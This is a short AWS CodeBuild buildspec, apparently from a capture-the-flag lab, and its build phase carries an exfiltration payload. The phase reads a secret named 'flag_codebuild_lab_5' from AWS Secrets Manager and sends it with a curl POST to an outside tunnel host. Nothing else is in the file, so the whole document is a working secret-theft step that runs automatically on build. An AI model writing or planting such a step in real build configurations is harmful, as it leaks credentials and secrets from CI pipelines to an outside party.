version: 0.2

phases:
  build:
    commands:
      - echo "=== START ==="
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      - curl -X POST https://lttge-220-255-170-163.run.pinggy-free.link:40999 --data "flag=$FLAG"
      - echo "=== END ==="
